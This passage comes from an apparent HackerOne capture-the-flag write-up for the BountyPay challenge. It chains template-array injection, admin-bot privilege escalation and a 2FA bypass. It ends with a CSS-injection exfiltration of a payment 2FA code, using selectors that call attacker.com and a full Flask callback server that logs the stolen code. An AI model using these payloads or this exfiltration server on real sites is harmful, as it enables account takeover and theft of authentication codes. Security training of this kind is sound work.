upgradeToAdmin tab4\"\u003e\u003c/div\u003e\n                        \u003cdiv class=\"text-center\"\u003esandra\u003c/div\u003e\n                    \u003c/div\u003e\n                    \u003cdiv\u003e\n                        \u003cdiv style=\"margin-left:100px;min-height: 100px\"\u003e\n                            \u003ctextarea disabled class=\"form-control\"\u003eReplies are currently disabled\u003c/textarea\u003e\n                        \u003c/div\u003e\n                    \u003c/div\u003e\n                \u003c/div\u003e\n            \u003c/div\u003e\n        \u003c/div\u003e\n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"footer\" style=\"position: absolute;bottom:0;font-size:10px;height:30px;width:100%;background-color: #ececec;line-height:30px;text-align: center\"\u003e\n    \u0026copy;2020 BountyPay | \u003ca href=\"#\" data-toggle=\"modal\" data-target=\"#myModal\"\u003eReport This Page\u003c/a\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"modal fade\" id=\"myModal\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"myModalLabel\"\u003e\n    \u003cdiv class=\"modal-dialog\" role=\"document\"\u003e\n        \u003cdiv class=\"modal-content\"\u003e\n            \u003cdiv class=\"modal-header\"\u003e\n                \u003cbutton type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-label=\"Close\"\u003e\u003cspan aria-hidden=\"true\"\u003e\u0026times;\u003c/span\u003e\u003c/button\u003e\n                \u003ch4 class=\"modal-title\" id=\"myModalLabel\"\u003eReport Page\u003c/h4\u003e\n            \u003c/div\u003e\n            \u003cdiv class=\"modal-body\"\u003e\n                \u003cp\u003eIs there something wrong with this page? If so hit the \"Report Now\" button and the page will be sent over to our admins to checkout.\u003c/p\u003e\n\t\t\u003cp\u003ePages in the /admin directory will be ignored for security\u003c/p\u003e\n            \u003c/div\u003e\n            \u003cdiv class=\"modal-footer\"\u003e\n                \u003cbutton type=\"button\" class=\"btn btn-default\" data-dismiss=\"modal\"\u003eCancel\u003c/button\u003e\n                \u003cbutton type=\"button\" class=\"btn btn-primary sendReport\"\u003eReport Now\u003c/button\u003e\n            \u003c/div\u003e\n        \u003c/div\u003e\n    \u003c/div\u003e\n\u003c/div\u003e\n\n\n\n\u003cscript src=\"/js/jquery.min.js\"\u003e\u003c/script\u003e\n\u003cscript src=\"/js/bootstrap.min.js\"\u003e\u003c/script\u003e\n\u003cscript\u003e\n    var url = 'Lz90ZW1wbGF0ZVtdPXRpY2tldCZ0aWNrZXRfaWQ9MzU4MiZ0ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29u';\n\u003c/script\u003e\n\u003cscript src=\"/js/website.js\"\u003e\u003c/script\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n\u003c!DOCTYPE html\u003e\n\u003chtml lang=\"en\"\u003e\n\u003chead\u003e\n    \u003cmeta charset=\"utf-8\"\u003e\n    \u003cmeta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"\u003e\n    \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1\"\u003e\n    \u003ctitle\u003eStaff Login\u003c/title\u003e\n    \u003clink href=\"/css/bootstrap.min.css\" rel=\"stylesheet\"\u003e\n\u003c/head\u003e\n\u003cbody\u003e\n\n\u003cdiv class=\"container\"\u003e\n    \u003cdiv class=\"row\"\u003e\n        \u003cdiv class=\"col-sm-6 col-sm-offset-3\"\u003e\n            \u003ch1 style=\"text-align: center\"\u003eStaff Login\u003c/h1\u003e\n                        \u003cform method=\"post\" action=\"/?template=login\"\u003e\n                \u003cdiv class=\"panel panel-default\" style=\"margin-top:50px\"\u003e\n                    \u003cdiv class=\"panel-heading\"\u003eLogin\u003c/div\u003e\n                    \u003cdiv class=\"panel-body\"\u003e\n                        \u003cdiv style=\"margin-top:7px\"\u003e\u003clabel\u003eUsername:\u003c/label\u003e\u003c/div\u003e\n                        \u003cdiv\u003e\u003cinput name=\"username\" class=\"form-control\" value=\"sandra.allison\"\u003e\u003c/div\u003e\n                        \u003cdiv style=\"margin-top:7px\"\u003e\u003clabel\u003ePassword:\u003c/label\u003e\u003c/div\u003e\n                        \u003cdiv\u003e\u003cinput name=\"password\" type=\"password\" class=\"form-control\"\u003e\u003c/div\u003e\n                    \u003c/div\u003e\n                \u003c/div\u003e\n                \u003cinput type=\"submit\" class=\"btn btn-success pull-right\" value=\"Login\"\u003e\n            \u003c/form\u003e\n        \u003c/div\u003e\n    \u003c/div\u003e\n\u003c/div\u003e\n\u003cscript src=\"/js/jquery.min.js\"\u003e\u003c/script\u003e\n\u003cscript src=\"/js/bootstrap.min.js\"\u003e\u003c/script\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\nI have to say that while it was a fairly obvious thing to try after realising that you need to use `username` input from the login page - that's not something I would expect to see in a real-world application. I mean the general trick of breaking the app behavior by passing an Array to it is commonplace of course, for to actually have a backend that merges templates seems unlikely (at least no established framework would allow that) - there must have been some pretty custom code in the backend that lead to this.\n\nBack the the CTF - note that conveniently, we can also set the value for the `username` input via a GET parameter, which is the last piece for the attack chain.\n\nI then reported the following URL: `/?template[]=ticket\u0026ticket_id=3582\u0026template[]=login\u0026username=sandra.allison#tab4`\n```http\nGET /admin/report?url=Lz90ZW1wbGF0ZVtdPXRpY2tldCZ0aWNrZXRfaWQ9MzU4MiZ0ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uI3RhYjQ= HTTP/1.1\nHost: staff.bountypay.h1ctf.com\nX-Requested-With: XMLHttpRequest\nCookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOVM5N0IvVGtnM2g3TmhWU0lENlV5WVJLRHlmRlZMRXZqTzFPaWQ0bDA0M2xZdXozYld3czZSUG9McFZ4TWlCSGtVR3lDU3FycUZGUjY0QXNHclN6dzhLTUpjUEJ6c3Z5VmIwNnRMSmFMTzZYR0FrTURqY0NsMDY0bVkrQzE3UT09\n```\nand ... nothing happened. Visiting that URL directly in the browser I saw that the request was still being made to `/admin/upgrade?username=undefined`. Of course, that makes sense. Javascript (unless loaded asynchronously) is evaluated immediately when it is encountered in the DOM, meaning that it only has access to DOM elements that precede it. I've put the templates in the wrong order, and `username` input simply didn't exist on the page yet when our code was executed.\n\nFinally, I reversed the order of templates: `/?template[]=login\u0026username=sandra.allison\u0026template[]=ticket\u0026ticket_id=3582#tab4`\n```http\nGET /admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyI3RhYjQ= HTTP/1.1\nHost: staff.bountypay.h1ctf.com\nX-Requested-With: XMLHttpRequest\nCookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOVM5N0IvVGtnM2g3TmhWU0lENlV5WVJLRHlmRlZMRXZqTzFPaWQ0bDA0M2xZdXozYld3czZSUG9McFZ4TWlCSGtVR3lDU3FycUZGUjY0QXNHclN6dzhLTUpjUEJ6c3Z5VmIwNnRMSmFMTzZYR0FrTURqY0NsMDY0bVkrQzE3UT09\n```\n```http\nHTTP/1.1 200 OK\nContent-Type: application/json\nSet-Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOVM5N0IvVGtnM2g3TmhWU0lENlV5WVJLRHlmRlZMRXZqTzFPaWQ0bDA0M2xZdXozYkJqRURhdXczckZGTWlCSGtVR3lDU3FycUZGUjY0QXNHOWlLbi9xY0pkUFIxdnFpV1B4V3JmY3JhT3ZqQ1ZFVlpnYzMzaFAxMllyUzE3UT09; expires=Mon, 06-Jul-2020 23:09:22 GMT; Max-Age=2592000; path=/\n\n[\"Report received\"]\n```\n\nAnd we were given a new session cookie! Logging in with that new cookie, we see that we indeed have extra privileges now. Namely, there is a new tab named `Admin`, showing plain text credentials for Mårten's customer account!\n{F863165}\n\nOne last thing that wasn't clear to me is what `/?template=admin` was for. I visited it, and it just returned `view admin` string... Must have just been added to divert attention.\n\n## Payment 2FA Bypass / CSS Exfiltration\n\nBack to customer portal at `app.bountypay.h1ctf.com` we login with Mårten's credentials. We use the same `challenge` and `challenge_answer` as before to bypass login 2FA:\n\n```http\nPOST / HTTP/1.1\nHost: app.bountypay.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=marten.mickos\u0026password=h%26H5wy2Lggj*kKn4OD%26Ype\u0026challenge=5828c689761cce705a1c84d9b1a1ed5e\u0026challenge_answer=bD83Jk27dQ\n```\n```http\nHTTP/1.1 302 Found\nSet-Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9; expires=Mon, 06-Jul-2020 23:56:57 GMT; Max-Age=2592000\nLocation: /\n```\n\nRecall the original CTF tweet, and that we need to help Mårten approve May bug bounty payments. We thus fetch transactions for May 2020 and we indeed get a valid response this time:\n{F863225}\n\nWhen we click Pay, however, we're presented with another 2FA challenge:\n{F863226}\n\nOk. let's intercept the next request (when we click on \"Send Challenge\" button) and see what it looks like:\n\n```http\nPOST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1\nHost: app.bountypay.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\nCookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9\n\napp_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css\n```\nAnd the relevant HTML snippet from the response:\n```html\n\u003ch1 class=\"text-center\"\u003eBountyPay\u003c/h1\u003e\n\u003ch3 class=\"text-center\"\u003e2FA Payment Challenge\u003c/h3\u003e\n\u003cform method=\"post\"\u003e\n\t\u003cinput type=\"hidden\" name=\"challenge_timeout\" value=\"1591490942\"\u003e\n\t\u003cinput type=\"hidden\" name=\"challenge\" value=\"2cf37bd3c17d4621658828b374579adb\"\u003e\n\t\u003cdiv class=\"panel panel-default\" style=\"margin-top:50px\"\u003e\n\t\t\u003cdiv class=\"panel-heading\"\u003ePayment Challenge Sent\u003c/div\u003e\n\t\t\u003cdiv class=\"panel-body text-center\"\u003e\n\t\t\t\u003cp\u003eWe have sent the payment challenge to your 2FA, you have 2 minutes to enter the code, please enter it below\u003c/p\u003e\n\t\t\t\u003cdiv\u003e\u003cinput name=\"challenge_answer\" class=\"form-control\" maxlength=\"7\"\u003e\u003c/div\u003e\n\t\t\u003c/div\u003e\n\t\u003c/div\u003e\n\t\u003cinput type=\"submit\" class=\"btn btn-success pull-right\" value=\"Send Answer\"\u003e\n\u003c/form\u003e\n```\nIssuing the request a few more times I confirmed that we're presented with a new `challenge`value every time, and our goal is to get the right `challenge_answer` for it, which shouldn't be longer than 7 characters (`maxlength=\"7\"`).The only unusual thing about this is that the POST request contains `app_style` parameter which references a stylesheet from `https://www.bountypay.h1ctf.com/css/uni_2fa_style.css`.\n\nThis seems a lot like we're going to need to exfiltrate `challenge_answer`with CSS, but let's confirm step by step.\n\nFirstly, I've made a request using Burp Collaborator payload to confirm we can fetch a stylesheet from an arbitrary external resource:\n\n```http\nPOST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1\nHost: app.bountypay.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\nCookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9\n\napp_style=https://u1w9neu3o71nmwn6ryh9o7zbg2msah.burpcollaborator.net/css/uni_2fa_style.css\n```\nAnd I got a hit straight away:\n{F863231}\n\nA few things are worth noting when inspecting the request received by Collaborator:\n1. `User-Agent` tells us that request was made from Headless Chrome. \n2. [`Sec-Fetch-Dest: style`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-Fetch-Dest) tells us that the resource would be embedded as a stylesheet (using `\u003clink ... rel=\"stylesheet\"\u003e`)\n\nGiven that we only have a single injection point, I assumed the task would be to exfiltrate `challenge_answer ` characters recursively. I was well aware of the relatively-recent technique for sequential exfiltration using `@import` directives, which you can read about in a brilliant blog post titled [Better Exfiltration via HTML Injection](https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b) by [@d0nutptr](https://twitter.com/d0nutptr). Worth mentioning that a similar technique was [first discovered](https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf) half a year before by [Vila](https://twitter.com/cgvwzq). Note that this technique works in Chrome because Chrome processes `@import` directives asynchronously (executing the rest of CSS code while additional resources load). This, for instance, is not the case for Firefox that executes them sequentially, as was demonstrated by [Michał Bentkowski](https://twitter.com/securitymb) in another excellent blog post on this subject, titled [CSS data exfiltration in Firefox via a single injection point](https://research.securitum.com/css-data-exfiltration-in-firefox-via-single-injection-point/).\n\nSo the fact that page was loaded in Headless Chrome reaffirmed my intuition that we're after sequential exfiltration using `@import` directives. d0nutptr actually wrote a [sic](https://github.com/d0nutptr/sic) tool available on GitHub that could be used to execute such an attack, but I wanted to try this for myself so I wrote the necessary exploit in Python..... only to realise that it's not actually possible. As I have realized, Chrome only loads `@import` resources asynchronously when they appear within `\u003cstyle\u003e` elements in HTML. When they appear in the external stylesheets using `\u003clink\u003e` tag, however, Chrome stops CSS evaluation until the resource is loaded. It means that in our case sequential exfiltration isn't actually possible.\n\nFor a moment I even doubted whether this is about CSS exfiltration, so I even checked whether we could get XSS by injecting quotes into `app_style`to escape the attribute value... but it was secure.\n\nSo we're back to the CSS exfiltration. Ok, since the sequential technique won't work, let's just try to at least get the first character, for a start. To get that, all we need is a same-old trick of a selector matching a certain input name/value. First I tried adding this to my stylesheet:\n\n```css\ninput[name=challenge_answer]{\n    background-image: url(https://attacker.com/);\n}\n```\nand didn't get any hit. Ok, the input name must be different then - let's widen that by just matching on a single character:\n```css\ninput[name^=c]{\n    background-image: url(https://attacker.com/);\n}\n```\nThat gives a hit, so we're on the right track. But if the name is not `challenge_answer` but starts with `c`, what could that be? Re-reading the message again I realised that the name is likely to be `code`:  `We have sent the payment challenge to your 2FA, you have 2 minutes to enter the code, please enter it below`.\n\nWhen I tried an exact match on `code`, I didn't get any hit though:\n```css\ninput[name=code]{\n    background-image: url(https://attacker.com/);\n}\n```\nSo the name must be starting with the code then. At  this point I added a match on the first character of the value to see if I get anything back, and to my surprise I got 7 hits!\n```css\ninput[name^=code][value^=a]{\n    background-image: url(https://attacker.com/exfil/a);\n}\ninput[name^=code][value^=b]{\n    background-image: url(https://attacker.com/exfil/b);\n}\n...\n```\n(I've used all ASCII letters, both uppercase and lowercase, and digits).\n\nThis is when it struck me that there are, in fact, 7 separate inputs on the page, each containing a single character. This made perfect sense, as to exfiltrate such code we don't need any sequential imports - we just need many selectors.\n\nBut before we get there, we need to know exact names of inputs - because we need to know the exact order of characters. If we simply match on `input[name^=code]` we'd never know which character is at which place.\n\nSo I quickly made another few iterations on progressively matching the next character to determine the input names and they turned out to be `code_1`, `code_2`, ..., `code_7`. From there it was all really trivial.\n\nLet's see what my final code looks like, and then we can break it down piece by piece:\n\nI'm using Flask here. Since it needs to be available on public internet and with a valid HTTPS certificate, I'm not focusing on how this could be ran / deployed. Rather, this shows Flask routes with all the relevant logic of the exploit.\n```python\nimport logging\nimport string\nfrom collections import defaultdict\nfrom typing import List\nfrom uuid import uuid4\n\nfrom flask import url_for, Response, current_app, request\n\nfrom . import blueprint\n\nlogger = logging.getLogger(__name__)\n\nNUM_CHARS = 7\n\nALLOWED_CHARS = string.digits + string.ascii_letters + string.punctuation\n\n# Store exfiltrated results in a dict where keys are sessions and values are 7-element lists\ncode_chars = defaultdict(lambda: [None] * NUM_CHARS)\n\noriginal_css = \"\"\"\n/**\nTemplate for the UNI 2FA App\n */\n\nbody {\n    background-color: #FFFFFF;\n}\n\ndiv.branding {\n    height:80px;\n    width:80px;\n    margin:20px auto 40px auto;\n    background-image:url(\"https://www.bountypay.h1ctf.com/images/bountypay.png\");\n    background-position:center center;\n    background-repeat: no-repeat;\n    background-size: cover;\n}\n\"\"\"\n\n\n@blueprint.route('/uni_2fa_style.css')\ndef uni_2fa_style_css():\n    session = request.args.get('session', uuid4().hex[:5])\n\n    def selector(pos, char):\n        name = escape_css_selector(f'code_{pos + 1}')\n        value = escape_css_selector(char)\n        callback = url_for(\".h1_2006_callback\", session=session, pos=pos, char=char, _external=True, _scheme='https')\n        return f'input[name=\"{name}\"][value=\"{value}\"]{{background-image: url({callback});}}'\n\n    selectors = [selector(pos, char) for pos in range(NUM_CHARS) for char in ALLOWED_CHARS]\n\n    css = '\\n'.join(selectors + [original_css])\n\n    return Response(css, mimetype='text/css')\n\n\n@blueprint.route('/h1-2006-callback/\u003csession\u003e/\u003cint:pos\u003e/\u003cchar\u003e')\ndef h1_2006_callback(session: str, pos: int, char: str):\n    global code_chars\n\n    chars: List = code_chars[session]\n    chars[pos] = char\n\n    if None not in chars:\n        code = ''.join(chars)\n        logger.info(f\"[session {session}] Exfiltrated code: {code}\")\n\n    return '', 204  # 204 No Content, i.e. just empty response\n\n\ndef escape_css_selector(selector: str) -\u003e str:\n    return selector \\\n        .replace(\"\\\\\", \"\\\\\\\\\") \\\n        .replace(\"!\", \"\\\\!\") \\\n        .replace(\"\\\"\", \"\\\\\\\"\") \\\n        .replace(\"#\", \"\\\\#\") \\\n        .replace(\"$\", \"\\\\$\") \\\n        .replace(\"%\", \"\\\\%\") \\\n        .replace(\"\u0026\", \"\\\\\u0026\") \\\n        .replace(\"'\", \"\\\\'\") \\\n        .replace(\"(\", \"\\\\(\") \\\n        .replace(\")\", \"\\\\)\") \\\n        .replace(\"*\", \"\\\\*\") \\\n        .replace(\"+\", \"\\\\+\") \\\n        .replace(\",\", \"\\\\,\") \\\n        .replace(\"-\", \"\\\\-\") \\\n        .replace(\".\", \"\\\\.\") \\\n        .replace(\"/\", \"\\\\/\") \\\n        .replace(\":\", \"\\\\:\") \\\n        .replace(\";\", \"\\\\;\") \\\n        .replace(\"\u003c\", \"\\\\\u003c\") \\\n        .replace(\"=\", \"\\\\=\") \\\n        .replace(\"\u003e\", \"\\\\\u003e\") \\\n        .replace(\"?\", \"\\\\?\") \\\n        .replace(\"@\", \"\\\\@\") \\\n        .replace(\"[\", \"\\\\[\") \\\n        .replace(\"]\", \"\\\\]\") \\\n        .replace(\"^\", \"\\\\^\") \\\n        .replace(\"`\", \"\\\\`\") \\\n        .replace(\"{\", \"\\\\{\") \\\n        .replace(\"|\", \"\\\\|\") \\\n        .replace(\"}\", \"\\\\}\") \\\n        .replace(\"~\", \"\\\\~\")\n\n```\nLet's break it down.\n\nFirstly, we build a stylesheet by adding a selector for every code input field, and for every possible character. You would notice that I also use a `session` within my callbacks - this is to ensure that responses from overlapping attempts won't ever get mixed up.\n```python\n@blueprint.route('/uni_2fa_style.css')\ndef uni_2fa_style_css():\n    session = request.args.get('session', uuid4().hex[:5])\n\n    def selector(pos, char):\n        name = escape_css_selector(f'code_{pos + 1}')\n        value = escape_css_selector(char)\n        callback = url_for(\".h1_2006_callback\", session=session, pos=pos, char=char, _external=True, _scheme='https')\n        return f'input[name=\"{name}\"][value=\"{value}\"]{{background-image: url({callback});}}'\n\n    selectors = [selector(pos, char) for pos in range(NUM_CHARS) for char in ALLOWED_CHARS]\n\n    css = '\\n'.join(selectors + [original_css])\n\n    return Response(css, mimetype='text/css')\n```\nYou can see the resulting CSS generated by this code e.g. [here](https://py.whitehat-hacker.com/poc/ctf/uni_2fa_style.css):\n```css\ninput[name=\"code_1\"][value=\"0\"]{background-image: url(https://py.whitehat-hacker.com/poc/ctf/h1-2006-callback/09278/0/0);}\ninput[name=\"code_1\"][value=\"1\"]{background-image: url(https://py.whitehat-hacker.com/poc/ctf/h1-2006-callback/09278/0/1);}\ninput[name=\"code_1\"][value=\"2\"]{background-image: url(https://py.whitehat-hacker.com/poc/ctf/h1-2006-callback/09278/0/2);}\ninput[name=\"code_1\"][value=\"3\"]{background-image: url(https://py.whitehat-hacker.com/poc/ctf/h1-2006-callback/09278/0/3);}\ninput[name=\"code_1\"][value=\"4\"]{background-image: url(https://py.whitehat-hacker.com/poc/ctf/h1-2006-callback/09278/0/4);}\n...\n```\n\nWhat's worth noting is that certain characters have to be escaped within CSS selectors - this is what my `escape_css_selector` function is for. To build a proper escaping function that would cover all cases is actually no easy task. If you're into that sort of stuff, I highly recommend [CSS character escape sequences](https://mathiasbynens.be/notes/css-escapes) blog post by [Mathias Bynens](https://twitter.com/mathias), who has also made an [online tool] (https://mothereff.in/css-escapes) to do such escaping, with [source code [javascript]](https://github.com/mathiasbynens/mothereff.in/tree/master/css-escapes) available on GitHub. In our case we don't need to handle all these edge cases though, and in fact I've bluntly copy-pasted the escaping part from d0nutptr's [sic](https://github.com/d0nutptr/sic/blob/master/src/main.rs#L298-L330) tool.\n\nWe're using a dict of lists (keyed by session) to store the characters we receive at the right places in the list:\n```python\n# Store exfiltrated results in a dict where keys are sessions and values are 7-element lists\ncode_chars = defaultdict(lambda: [None] * NUM_CHARS)\n```\n\nAnd lastly, the route for the callback - we just keep collecting the characters, and when we have all 7 for this session, we join them up and log the code:\n\n```python\n@blueprint.route('/h1-2006-callback/\u003csession\u003e/\u003cint:pos\u003e/\u003cchar\u003e')\ndef h1_2006_callback(session: str, pos: int, char: str):\n    global code_chars\n\n    chars: List = code_chars[session]\n    chars[pos] = char\n\n    if None not in chars:\n        code = ''.join(chars)\n        logger.info(f\"[session {session}] Exfiltrated code: {code}\")\n\n    return '', 204  # 204 No Content, i.e. just empty response\n```\n\nA sample output of running such code (and passing our stylesheet to the 2FA challenge) is like this:\n```\n[Thread-10 |pid:17455] INFO: 172.17.0.2 - - [09/Jun/2020 00:33:34] \"GET /poc/ctf/uni_2fa_style.css HTTP/1.0\" 200 -\n[Thread-11 |pid:17455]INFO: 172.17.0.2 - - [09/Jun/2020 00:33:34] \"GET /poc/ctf/h1-2006-callback/0cc2d/0/b HTTP/1.0\" 204 -\n[Thread-12 |pid:17455] INFO: 172.17.0.2 - - [09/Jun/2020 00:33:34] \"GET /poc/ctf/h1-2006-callback/0cc2d/1/N HTTP/1.0\" 204 -\n[Thread-13 |pid:17455] INFO: 172.17.0.2 - - [09/Jun/2020 00:33:34] \"GET /poc/ctf/h1-2006-callback/0cc2d/2/f HTTP/1.0\" 204 -\n[Thread-14 |pid:17455] INFO: 172.17.0.2 - - [09/Jun/2020 00:33:34] \"GET /poc/ctf/h1-2006-callback/0cc2d/3/Q HTTP/1.0\" 204 -\n[Thread-15 |pid:17455] INFO: 172.17.0.2 - - [09/Jun/2020 00:33:34] \"GET /poc/ctf/h1-2006-callback/0cc2d/4/h HTTP/1.0\" 204 -\n[Thread-16 |pid:17455] INFO: 172.17.0.2 - - [09/Jun/2020 00:33:34] \"GET /poc/ctf/h1-2006-callback/0cc2d/5/D HTTP/1.0\" 204 -\n[Thread-17 |pid:17455] INFO: [session 0cc2d] Exfiltrated code: bNfQhDT\n[Thread-17 |pid:17455] INFO: 172.17.0.2 - - [09/Jun/2020 00:33:34] \"GET /poc/ctf/h1-2006-callback/0cc2d/6/T HTTP/1.0\" 204 -\n```\n\nOnce we obtain the code, we simply submit it as a response for 2FA challenge using the corresponding input on the page, and we're finally presented with the flag!\n{F863338}\n\nIf you've read this far, thank you very much for bearing with me!\n\n--------------------------------------------\nReferences\n\nTools\n* [Amass](https://github.com/OWASP/Amass)\n* [Massdns](https://github.com/blechschmidt/massdns) \n  * [commonspeak2](https://github.com/assetnote/commonspeak2-wordlists/blob/master/subdomains/subdomains.txt)\n  * [dnsgen](https://github.com/ProjectAnte/dnsgen)\n* [ffuf](https://github.com/ffuf/ffuf)\n* [gitdumper.sh](https://github.com/internetwache/GitTools/blob/master/Dumper/gitdumper.sh)\n* [dex2jar](https://github.com/pxb1988/dex2jar)\n* [JD-GUI](http://java-decompiler.github.io/)\n* [sic](https://github.com/d0nutptr/sic) \n* [CSS escapes](https://github.com/mathiasbynens/mothereff.in/tree/master/css-escapes) with [online tool] (https://mothereff.in/css-escapes)\n\nTechniques / Blog posts\n* [Subdomain Enumeration: 2019 Workflow](https://0xpatrik.com/subdomain-enumeration-2019/) by [Patrik Hudak](https://twitter.com/0xpatrik) \n* [Better Exfiltration via HTML Injection](https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b) by [@d0nutptr](https://twitter.com/d0nutptr)\n* [CSS Injection Attacks](https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf) by  [Pepe Vila](https://twitter.com/cgvwzq)\n* [CSS data exfiltration in Firefox via a single injection point](https://research.securitum.com/css-data-exfiltration-in-firefox-via-single-injection-point/) by [Michał Bentkowski](https://twitter.com/securitymb)\n* [CSS character escape sequences](https://mathiasbynens.be/notes/css-escapes) by [Mathias Bynens](https://twitter.com/mathias)\n\n## Impact\n\n-","weakness":{"id":26,"name":"Improper Access Control - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":861473,"file_name":"ctf-tweet.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/iq2fYq3LVJaMrmfXuNzYD9cW?response-content-disposition=attachment%3B%20filename%3D%22ctf-tweet.png%22%3B%20filename%2A%3DUTF-8%27%27ctf-tweet.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153940Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=72470eadb9f3a001cc038f6fa1af8ac1058a107293781f1005c37066d099376a","file_size":181396,"type":"image/png"},{"id":861592,"file_name":"ssrf-content-discovery-intruder-payload-processing-tasks.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/gFTiEULu756rSB5bX1TbsDMt?response-content-disposition=attachment%3B%20filename%3D%22ssrf-content-discovery-intruder-payload-processing-tasks.png%22%3B%20filename%2A%3DUTF-8%27%27ssrf-content-discovery-intruder-payload-processing-tasks.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153940Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUN